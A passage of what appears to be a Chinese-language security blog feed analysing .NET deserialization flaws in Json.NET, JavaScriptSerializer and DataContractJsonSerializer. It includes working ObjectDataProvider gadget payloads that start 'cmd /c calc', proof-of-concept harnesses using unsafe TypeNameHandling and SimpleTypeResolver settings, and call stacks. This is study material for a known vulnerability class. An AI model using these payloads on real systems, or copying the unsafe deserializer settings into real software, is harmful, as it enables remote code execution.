JsonConvert.SerializeObject(person);</span><br><span class="line">            <span class="built_in">string</span> v1 = JsonConvert.SerializeObject(person, <span class="keyword">new</span> JsonSerializerSettings()</span><br><span class="line">            &#123;</span><br><span class="line">                TypeNameHandling = TypeNameHandling.None</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="built_in">string</span> v2 = JsonConvert.SerializeObject(person, <span class="keyword">new</span> JsonSerializerSettings()</span><br><span class="line">            &#123;</span><br><span class="line">                TypeNameHandling = TypeNameHandling.All</span><br><span class="line">            &#125;);</span><br><span class="line">            Console.WriteLine(v);</span><br><span class="line">            Console.WriteLine(v1);</span><br><span class="line">            Console.WriteLine(v2);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240314104145822.png" alt="image-20240314104145822"></p><p>前两个输出没有<code>type</code>值  最后一个才有 我们来分析一下这个情况 </p><p><img src="../images/image-20240314104232968.png" alt="image-20240314104232968"></p><p>没有传入setting的情况下</p><p><img src="../images/image-20240314104310300.png" alt="image-20240314104310300"></p><p>然后进入到这个函数中  其实第二个也是会进入到这   然后这个CreatDefault函数的话是会实例化这个JsonSerializer类</p><p><img src="../images/image-20240314104430617.png" alt="image-20240314104430617"></p><p>最终是会走到这  </p><p>然后我们接着去看<code>TypeNameHandling</code>这个参数的不同引起的序列化时有没有<code>type</code>的结果</p><p><img src="../images/image-20240314104635026.png" alt="image-20240314104635026"></p><p><img src="../images/image-20240314104706328.png" alt="image-20240314104706328"></p><p>我们会发现我们传入的默认值时None   那么前两个的结果都是一样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string v = JsonConvert.SerializeObject(person);</span><br><span class="line">string v1 = JsonConvert.SerializeObject(person, new JsonSerializerSettings()</span><br><span class="line">&#123;</span><br><span class="line">    TypeNameHandling = TypeNameHandling.None</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240314104817515.png" alt="image-20240314104817515"></p><p>这个时关于TypeNameHandling值得多少对应得结果</p><p>除了None外，都会包含type信息。文档中标记了TypeNameHandling会产生安全问题，应该使用binder进行类型绑定。</p><p>而本文就是针对TypeNameHandling进行讲解，当TypeNameHandling非None时，可以传入自定义json触发RCE。</p><h2 id="攻击链ObjectDataProvider"><a href="#攻击链ObjectDataProvider" class="headerlink" title="攻击链ObjectDataProvider"></a>攻击链ObjectDataProvider</h2><p>使用yso生成得poc</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;$type&#x27;</span>:<span class="string">&#x27;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;MethodName&#x27;</span>:<span class="string">&#x27;Start&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;MethodParameters&#x27;</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;$type&#x27;</span>:<span class="string">&#x27;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$values&#x27;</span>:[<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;/c calc&#x27;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;ObjectInstance&#x27;</span>:&#123;<span class="string">&#x27;$type&#x27;</span>:<span class="string">&#x27;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Json.NetSerializer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// JsonConvert</span></span><br><span class="line">            JsonConvert.DeserializeObject(File.ReadAllText(<span class="string">&quot;1.json&quot;</span>),<span class="keyword">new</span> JsonSerializerSettings() &#123; TypeNameHandling =TypeNameHandling.All&#125;);</span><br><span class="line">            <span class="comment">// JsonSerializer</span></span><br><span class="line">            JsonSerializer jsonSerializer = JsonSerializer.CreateDefault();</span><br><span class="line">            jsonSerializer.TypeNameHandling = TypeNameHandling.All;</span><br><span class="line">            <span class="keyword">using</span> (StreamReader sr = <span class="keyword">new</span> StreamReader(<span class="string">&quot;1.json&quot;</span>))</span><br><span class="line">            <span class="keyword">using</span> (JsonReader reader = <span class="keyword">new</span> JsonTextReader(sr))</span><br><span class="line">            &#123;</span><br><span class="line">                jsonSerializer.Deserialize(reader);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用得时JsonConvert和JsonSerializer这两个类来进行演示  其实JsonConvert调用还是会调用到JsonSerializer的  效果一样</p><p><img src="../images/image-20240314110336221.png" alt="image-20240314110336221"></p><p>在CreatObject这个函数中的话  就会将type里的类给进行实例化操作了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Process.Start()</span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">RuntimeMethodInfo.UnsafeInvokeInternal()</span><br><span class="line">RuntimeMethodInfo.Invoke()</span><br><span class="line">RuntimeType.InvokeMember()</span><br><span class="line">ObjectDataProvider.InvokeMethodOnInstance()</span><br><span class="line">ObjectDataProvider.QueryWorker()</span><br><span class="line">ObjectDataProvider.BeginQuery()</span><br><span class="line">ObjectDataProvider.set_ObjectInstance()</span><br><span class="line">[Lightweight Method Call]</span><br><span class="line">DynamicValueProvider.SetValue()</span><br><span class="line">JsonSerializerInternalReader.SetPropertyValue()</span><br><span class="line">JsonSerializerInternalReader.PopulateObject()</span><br><span class="line">JsonSerializerInternalReader.CreateObject()</span><br><span class="line">JsonSerializerInternalReader.CreateValueInternal()</span><br><span class="line">JsonSerializerInternalReader.Deserialize()</span><br><span class="line">JsonSerializer.DeserializeInternal()</span><br><span class="line">JsonSerializer.Deserialize()</span><br><span class="line">JsonSerializer.Deserialize()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><p>这个是调用栈</p><p><strong>在传入的json可控和TypeNameHandling设置的值正确的情况下  都是可以RCE的</strong></p><p>既然说到了type 又说到了json  那么我们应该就能想到fastjson了   接下来我们就来了解一下这个的反序列化操作</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/Json.Net.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob/main/J</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-10</title>
    <link href="https://ke1nys.github.io/posts/cae71be0.html"/>
    <id>https://ke1nys.github.io/posts/cae71be0.html</id>
    <published>2024-03-13T08:26:46.000Z</published>
    <updated>2024-04-18T12:57:04.527Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JavaScriptSerializer"><a href="#JavaScriptSerializer" class="headerlink" title="JavaScriptSerializer"></a>JavaScriptSerializer</h2><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Web.Script.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">JavaScriptDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// no SimpleTypeResolver</span></span><br><span class="line">            Person person = <span class="keyword">new</span> Person() &#123; Name = <span class="string">&quot;jack&quot;</span> &#125;;</span><br><span class="line">            JavaScriptSerializer serializer = <span class="keyword">new</span> JavaScriptSerializer();</span><br><span class="line">            <span class="built_in">string</span> v = serializer.Serialize(person);</span><br><span class="line">            Console.WriteLine(v);</span><br><span class="line">            Person p = serializer.Deserialize&lt;Person&gt;(v);</span><br><span class="line">            Console.WriteLine(p.Name);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// SimpleTypeResolver</span></span><br><span class="line">            JavaScriptSerializer serializerWithType = <span class="keyword">new</span> JavaScriptSerializer(<span class="keyword">new</span> SimpleTypeResolver());</span><br><span class="line">            <span class="built_in">string</span> v1 = serializerWithType.Serialize(person);</span><br><span class="line">            Console.WriteLine(v1);</span><br><span class="line">            Person p1 = serializerWithType.Deserialize&lt;Person&gt;(v1);</span><br><span class="line">            Console.WriteLine(p1.Name);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;Name&quot;:&quot;jack&quot;&#125;</span><br><span class="line">jack</span><br><span class="line">&#123;&quot;__type&quot;:&quot;JavaScriptDeserialize.Person, ConsoleApplication2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot;,&quot;Name&quot;:&quot;jack&quot;&#125;</span><br><span class="line">jack</span><br></pre></td></tr></table></figure><p>这个类和DataContractJsonSerializer类有点类似  传需要的参数进去序列化内容才会有<code>__type</code>值</p><p>产生漏洞的原因是在构造函数有两个参数的重载：<code>public JavaScriptSerializer(JavaScriptTypeResolver resolver)</code>，其中JavaScriptTypeResolver参数是一个类型解析器，可在序列化字符串中自定义类型的元数据程序集限定名称。</p><p><img src="../images/image-20240313163841170.png" alt="image-20240313163841170"></p><p><strong>当构造函数使用SimpleTypeResolver参数时，序列化的json中会带有type信息，反序列化时就有漏洞隐患。反序列化方法有三个：</strong></p><h2 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h2><p>使用ObjectDataProvider攻击链，通过ObjectDataProvider来创建Process实例。payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;__type&#x27;:&#x27;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#x27;,</span><br><span class="line">    &#x27;MethodName&#x27;:&#x27;Start&#x27;,</span><br><span class="line">    &#x27;ObjectInstance&#x27;:&#123;</span><br><span class="line">        &#x27;__type&#x27;:&#x27;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;,</span><br><span class="line">        &#x27;StartInfo&#x27;: &#123;</span><br><span class="line">            &#x27;__type&#x27;:&#x27;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;,</span><br><span class="line">            &#x27;FileName&#x27;:&#x27;cmd&#x27;, &#x27;Arguments&#x27;:&#x27;/c calc&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Poc</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Web.Script.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">JavaScriptDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// SimpleTypeResolver</span></span><br><span class="line">            JavaScriptSerializer serializerWithType = <span class="keyword">new</span> JavaScriptSerializer(<span class="keyword">new</span> SimpleTypeResolver());</span><br><span class="line">            serializerWithType.Deserialize&lt;Object&gt;(File.ReadAllText(<span class="string">&quot;1.json&quot;</span>));</span><br><span class="line">            <span class="comment">// Console.ReadKey();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240313170356169.png" alt="image-20240313170356169"></p><p>JavaScriptSerializer的Deserialize函数中</p><p><img src="../images/image-20240313170432985.png" alt="image-20240313170432985"></p><p>在此进入到deserialized函数中</p><p><img src="../images/image-20240313170509348.png" alt="image-20240313170509348"></p><p>然后接着进入到BasicDeserialize函数中</p><p><img src="../images/image-20240313170539219.png" alt="image-20240313170539219"></p><p>发现其调用的我们payload中的<code>__type</code>参数   然后进入到ConvertObjectToType这个函数中 </p><p><img src="../images/image-20240313170627526.png" alt="image-20240313170627526"></p><p>然后在ConvertDictionaryToObject函数中一步一步的将我们传入的<code>__type</code>参数里的值转化为对象</p><p><img src="../images/image-20240313172256774.png" alt="image-20240313172256774"></p><p>然后最后在进入到Process的Start函数中就结束了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JavaScriptSerializer&quot;&gt;&lt;a href=&quot;#JavaScriptSerializer&quot; class=&quot;headerlink&quot; title=&quot;JavaScriptSerializer&quot;&gt;&lt;/a&gt;JavaScriptSerializer&lt;/h2&gt;&lt;</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-09</title>
    <link href="https://ke1nys.github.io/posts/aa209205.html"/>
    <id>https://ke1nys.github.io/posts/aa209205.html</id>
    <published>2024-03-12T09:02:15.000Z</published>
    <updated>2024-03-13T03:30:46.583Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractJsonSerializer.md">https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractJsonSerializer.md</a></p><h2 id="DataContractJsonSerializer"><a href="#DataContractJsonSerializer" class="headerlink" title="DataContractJsonSerializer"></a>DataContractJsonSerializer</h2><p>在dotnet中对于对象转json的处理有几大库，DataContractJsonSerializer、Json.net、JavaScriptSerializer。其中DataContractJsonSerializer、JavaScriptSerializer是dotnet自带的标准库，本文讲解DataContractJsonSerializer的使用。</p><p>这个类和xmlSerializer、DataContractSerializer一样  都是需要控制Type值 </p><p>Demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">int</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> p = <span class="keyword">new</span> Person();</span><br><span class="line">            p.name = <span class="string">&quot;John&quot;</span>;</span><br><span class="line">            p.age = <span class="number">42</span>;</span><br><span class="line">            <span class="keyword">var</span> memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            <span class="keyword">var</span> ser = <span class="keyword">new</span> DataContractJsonSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line">            ser.WriteObject(memoryStream, p);</span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">var</span> sr = <span class="keyword">new</span> StreamReader(memoryStream);</span><br><span class="line">            Console.WriteLine(sr.ReadToEnd());</span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            Person p1 = (Person)ser.ReadObject(memoryStream);</span><br><span class="line">            Console.WriteLine(p1.name);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person需要标记DataContract特性，序列化成员需要标记DataMember特性。通过WriteObject和ReadObject进行序列化和反序列化，demo和DataContractSerializer大致相同。注意构造函数传入了Person的type类型。如果实际环境type参数可控，那么可以造成RCE。</p><h2 id="WindowsPrincipal攻击链"><a href="#WindowsPrincipal攻击链" class="headerlink" title="WindowsPrincipal攻击链"></a>WindowsPrincipal攻击链</h2><p><img src="../images/image-20240313102416114.png" alt="image-20240313102416114"></p><p>yso生成的payload  关键点在于这个<code>__type</code>   __type字段可以通过DataContractJsonSerializerSettings传入DataContractJsonSerializer的构造方法</p><p><img src="../images/image-20240313102552811.png" alt="image-20240313102552811"></p><p>写个demo来测试一下</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">string</span> name;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">internal</span> <span class="built_in">int</span> age;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="built_in">object</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> settings = <span class="keyword">new</span> DataContractJsonSerializerSettings();</span><br><span class="line">            settings.EmitTypeInformation = EmitTypeInformation.Always;</span><br><span class="line">            <span class="keyword">var</span> ser = <span class="keyword">new</span> DataContractJsonSerializer(<span class="keyword">typeof</span>(Person), settings);</span><br><span class="line">            <span class="keyword">using</span> (FileStream file = <span class="keyword">new</span> FileStream(<span class="string">&quot;1.json&quot;</span>, FileMode.OpenOrCreate))</span><br><span class="line">            &#123;</span><br><span class="line">                Person person = <span class="keyword">new</span> Person();</span><br><span class="line">                person.name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">                person.age = <span class="number">19</span>;</span><br><span class="line">                ser.WriteObject(file, person);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当传入settings时    json中会包含<code>__type</code></p><p><img src="../images/image-20240313102711243.png" alt="image-20240313102711243"></p><p>当不传入settings时  json中不包含了<code>__type</code></p><p><img src="../images/image-20240313102832179.png" alt="image-20240313102832179"></p><p>当setting的EmitTypeInformation设置为EmitTypeInformation.Always时json会包含type信息。即上文yso生成的__type字段。</p><h3 id="Type可控"><a href="#Type可控" class="headerlink" title="Type可控"></a>Type可控</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> settings = <span class="keyword">new</span> DataContractJsonSerializerSettings();</span><br><span class="line">            settings.EmitTypeInformation = EmitTypeInformation.Always;</span><br><span class="line">            <span class="keyword">var</span> ser = <span class="keyword">new</span> DataContractJsonSerializer(Type.GetType(<span class="string">&quot;System.Security.Principal.WindowsPrincipal&quot;</span>), settings);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">using</span> (FileStream file = <span class="keyword">new</span> FileStream(<span class="string">&quot;1.json&quot;</span>, FileMode.OpenOrCreate))</span><br><span class="line">            &#123;</span><br><span class="line">                ser.ReadObject(file);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们的type可控的时候   我们使用yso生成的payload是可以直接打的</p><p><img src="../images/image-20240313103446937.png" alt="image-20240313103446937"></p><p>在我们使用yso生成的json传入进去后  这个setting可有可无的  实战中只需要控制这个type值就行了</p><h3 id="KnownType特性"><a href="#KnownType特性" class="headerlink" title="KnownType特性"></a>KnownType特性</h3><p>这个东西  Y4er师傅说了难利用  看代码也能看出来  他是直接在代码中设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[KnownType(typeof(WindowsPrincipal))]</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    [<span 